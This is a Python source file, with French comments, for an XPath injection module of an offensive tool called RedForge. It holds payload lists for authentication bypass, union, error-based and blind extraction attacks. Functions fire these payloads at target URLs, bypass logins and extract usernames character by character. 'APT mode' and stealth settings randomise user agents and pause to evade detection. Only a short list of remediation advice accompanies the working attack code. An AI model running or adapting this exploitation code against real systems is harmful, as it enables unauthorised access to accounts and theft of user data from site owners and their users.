#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection XPath pour RedForge
Détecte et exploite les vulnérabilités d'injection XPath
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class XPathInjectionConfig:
    """Configuration avancée pour l'injection XPath"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    timeout: int = 10
    extract_data: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_structure: bool = True
    max_extraction_length: int = 50
    blind_retries: int = 3


class XPathInjection:
    """Détection et exploitation avancée des injections XPath"""
    
    def __init__(self, config: Optional[XPathInjectionConfig] = None):
        """
        Initialise le détecteur d'injection XPath
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or XPathInjectionConfig()
        
        # Payloads d'injection XPath
        self.payloads = self._generate_payloads()
        
        # Signatures d'erreur XPath
        self.xpath_error_signatures = [
            r'XPathException', r'javax.xml.xpath', r'XPathEvalError',
            r'Invalid XPath', r'XPath syntax error', r'net.sf.saxon',
            r'XPathExpressionException', r'XPATH_ERROR', r'XPathFactory',
            r'XPathConstants', r'XPathExpression', r'org.xml.sax',
            r'com.sun.org.apache.xpath', r'XPathParseException'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
        self.extracted_data = []
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads d'injection XPath"""
        payloads = {
            "Authentication Bypass": [
                "' or '1'='1", "' or '1'='1' or ''='", "' or ''='",
                "' or 1=1", "' or '1'='1' --", "' or '1'='1' #",
                "' or '1'='1' /*", "admin' or '1'='1",
                "' or 'x'='x", "' or 1=1 or ''='",
                '" or "1"="1', '" or 1=1',
                "') or ('1'='1", "'] or '1'='1",
                "' or 1=1 or 1=1", "' or 'a'='a"
            ],
            "Boolean Based": [
                "' and '1'='1", "' and '1'='2",
                "' and 1=1", "' and 1=2",
                "' or count(//user)=1", "' or count(//user)>0",
                "' or count(/*)>0", "' and count(/*)=1",
                "' and string-length(//user[1]/@username)>0",
                "' and substring(//user[1]/@id,1,1)='a'",
                "' or contains(//user[1]/@username,'a')",
                "' or starts-with(//user[1]/@username,'a')"
            ],
            "Extraction": [
                "' or substring(//user[1]/@username,1,1)='a",
                "' or string-length(//user[1]/@password)>0",
                "' or name(/*[1])='users",
                "' or count(//*)>0",
                "' or //user[contains(.,'admin')]",
                "' or //user[position()=1]",
                "' or //user[1]/@username='admin",
                "' or //user[1]/@username='admin' or ''='",
                "' or //user[1]/text()='admin"
            ],
            "Union Based": [
                "'] | //* | //*['", "'] | //user | //*['",
                "'] | //user[@username] | //*['", "'] | //user[1] | //*['",
                "'] | //user[1]/@* | //*['", "'] | //user[1]/@username | //*['"
            ],
            "Error Based": [
                "' or '1'='1' and name(/*)='users",
                "' or '1'='1' and count(/*)>0",
                "' or '1'='1' and string-length(//user[1]/@username)>0",
                "' or '1'='1' and contains(//user[1]/@username,'a')",
                "' or '1'='1' and substring(//user[1]/@username,1,1)='a'"
            ],
            "Blind Boolean": [
                "' and substring(//user[1]/@username,{pos},1)='{char}",
                "' and string-length(//user[1]/@username)>{len}",
                "' and count(//user)={num}",
                "' and contains(//user[1]/@username,'{sub}')"
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection XPath
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - extract: Tenter d'extraire des données
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.extracted_data = []
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections XPath sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        try_extract = kwargs.get('extract', self.config.extract_data)
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, post_data, try_extract)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ Injection XPath: {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        if 'extract_data' in kwargs:
            self.config.extract_data = kwargs['extract_data']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads = min(self.config.max_payloads, 25)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['user', 'username', 'login', 'id', 'search', 'q', 'name', 'email',
                     'password', 'pass', 'pwd', 'account', 'role', 'group', 'filter']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameter(self, target: str, param: str, post_data: Optional[str],
                        try_extract: bool) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections XPath"""
        vulnerabilities = []
        
        for category, payload_list in self.payloads.items():
            if category == "Blind Boolean" and not self.config.detect_structure:
                continue
            
            for payload in payload_list[:self.config.max_payloads]:
                if self.config.random_delays:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_payload(target, param, payload, post_data)
                self.payloads_tested += 1
                
                if result['vulnerable']:
                    vuln = {
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "category": category,
                        "severity": "HIGH",
                        "evidence": result['evidence'],
                        "type": result.get('type', 'unknown'),
                        "risk_score": 85
                    }
                    
                    # Tentative d'extraction
                    if try_extract and category in ['Extraction', 'Boolean Based', 'Blind Boolean']:
                        extracted = self._extract_info_blind(target, param, post_data)
                        if extracted:
                            vuln["extracted"] = extracted
                            self.extracted_data.extend(extracted)
                    
                    vulnerabilities.append(vuln)
                    return vulnerabilities  # Arrêter pour ce paramètre
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str,
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload d'injection XPath"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'type': None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=self.config.timeout, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    original_value = query_params[param][0]
                    query_params[param] = [original_value + payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers,
                                      timeout=self.config.timeout, verify=False)
            
            # Vérifier les signatures d'erreur XPath
            for signature in self.xpath_error_signatures:
                if re.search(signature, response.text, re.IGNORECASE):
                    result['vulnerable'] = True
                    result['evidence'] = signature
                    result['type'] = 'error_based'
                    return result
            
            # Vérifier les changements de comportement (boolean based)
            if not result['vulnerable']:
                if ('1=1' in payload and 'success' in response.text.lower()) or \
                   ('1=2' in payload and 'error' in response.text.lower()):
                    result['vulnerable'] = True
                    result['evidence'] = 'boolean_based_difference'
                    result['type'] = 'boolean_based'
                    return result
                
                # Vérifier les différences de longueur
                if 'count(' in payload or 'string-length(' in payload:
                    if len(response.text) > 500:  # Réponse anormalement longue
                        result['vulnerable'] = True
                        result['evidence'] = 'length_difference'
                        result['type'] = 'boolean_based'
                        return result
                    
        except Exception:
            pass
        
        return result
    
    def _extract_info_blind(self, target: str, param: str, 
                            post_data: Optional[str]) -> List[str]:
        """
        Extraction d'informations via blind boolean injection XPath
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        extracted = []
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@.-/'
        
        # Détection du nombre d'utilisateurs
        for num in range(1, 11):
            payload = self.payloads["Blind Boolean"][2].format(num=num)
            result = self._test_payload(target, param, payload, post_data)
            if not result['vulnerable']:
                extracted.append(f"user_count: {num-1}")
                break
        
        # Extraction du nom d'utilisateur
        for pos in range(1, self.config.max_extraction_length + 1):
            found = False
            for char in charset:
                payload = self.payloads["Blind Boolean"][0].format(pos=pos, char=char)
                
                for attempt in range(self.config.blind_retries):
                    result = self._test_payload(target, param, payload, post_data)
                    if result['vulnerable']:
                        extracted.append(f"username_char_{pos}: {char}")
                        found = True
                        break
                
                if found:
                    break
            else:
                break
        
        return extracted
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "extracted_data": self.extracted_data,
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "extract_data": self.config.extract_data
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection XPath détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "auth_bypass": len([v for v in vulnerabilities if v['category'] == 'Authentication Bypass']),
                "extraction": len([v for v in vulnerabilities if v['category'] in ['Extraction', 'Blind Boolean']]),
                "boolean": len([v for v in vulnerabilities if v['category'] == 'Boolean Based'])
            },
            "by_type": {
                "error_based": len([v for v in vulnerabilities if v['type'] == 'error_based']),
                "boolean_based": len([v for v in vulnerabilities if v['type'] == 'boolean_based'])
            },
            "high_severity": len(vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Utiliser des requêtes XPath paramétrées")
            recommendations.add("Échapper les caractères spéciaux XPath (' \" [ ] ( ) = @ * / |)")
            recommendations.add("Valider et filtrer les entrées utilisateur")
        
        if any(v['category'] == 'Authentication Bypass' for v in vulnerabilities):
            recommendations.add("Implémenter une authentification multi-facteurs")
            recommendations.add("Ne pas utiliser XPath dynamique pour l'authentification")
        
        if any(v['type'] == 'error_based' for v in vulnerabilities):
            recommendations.add("Désactiver les messages d'erreur XPath détaillés en production")
        
        if any(v['category'] in ['Extraction', 'Blind Boolean'] for v in vulnerabilities):
            recommendations.add("Restreindre l'accès aux données sensibles via XPath")
        
        return list(recommendations)
    
    def bypass_auth(self, target: str, param: str, 
                    post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Tente de contourner l'authentification XPath
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        bypass_payloads = [
            "' or '1'='1", "' or ''='", "' or 1=1",
            "admin' or '1'='1", "' or 'x'='x",
            '" or "1"="1', "') or ('1'='1"
        ]
        
        for payload in bypass_payloads:
            result = self._test_payload(target, param, payload, post_data)
            if result['vulnerable']:
                return {
                    "success": True,
                    "payload": payload,
                    "evidence": result['evidence']
                }
        
        return {"success": False}
    
    def extract_users(self, target: str, param: str,
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Tente d'extraire la liste des utilisateurs
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            post_data: Données POST optionnelles
        """
        result = {
            "success": False,
            "users": [],
            "structure": {}
        }
        
        # Détection de la structure
        if self.config.detect_structure:
            # Compter le nombre d'utilisateurs
            for i in range(1, 20):
                payload = f"' or count(//user[{i}])>0"
                test_result = self._test_payload(target, param, payload, post_data)
                if not test_result['vulnerable']:
                    result["structure"]["user_count"] = i - 1
                    break
            
            # Extraire les noms d'utilisateurs
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
            users = []
            
            for user_idx in range(1, result["structure"].get("user_count", 5) + 1):
                username = ""
                for pos in range(1, 30):
                    found = False
                    for char in charset:
                        payload = f"' or substring(//user[{user_idx}]/@username,{pos},1)='{char}"
                        test_result = self._test_payload(target, param, payload, post_data)
                        if test_result['vulnerable']:
                            username += char
                            found = True
                            break
                    if not found:
                        break
                
                if username:
                    users.append(username)
                    result["success"] = True
            
            result["users"] = users
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits,
            "data_extracted": len(self.extracted_data) > 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = XPathInjection()
    results = injection.scan("https://example.com/login?user=admin")
    print(f"Vulnérabilités XPath: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = XPathInjectionConfig(apt_mode=True, max_payloads=25)
    injection_apt = XPathInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/login?user=admin", apt_mode=True)
    print(f"Vulnérabilités XPath (APT): {results_apt['count']}")
    
    # Exemple de bypass d'authentification
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        bypass_result = injection_apt.bypass_auth(
            "https://example.com/login",
            vuln['parameter']
        )
        if bypass_result['success']:
            print(f"Bypass réussi: {bypass_result['payload']}")
        
        # Extraction d'utilisateurs
        extract_result = injection_apt.extract_users(
            "https://example.com/login",
            vuln['parameter']
        )
        if extract_result['success']:
            print(f"Utilisateurs extraits: {extract_result['users']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")